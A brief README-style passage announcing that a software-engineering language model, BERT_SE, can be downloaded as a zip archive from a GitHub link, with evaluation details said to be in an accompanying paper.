...
The BERT_SE is available pelo link: https://raw.githubusercontent.com/elianedb/BERT_SE/main/Bungarus/BERT_SE-1.9.zip, for use in software engineering tasks. It results and details of the evaluation are in the paper. 
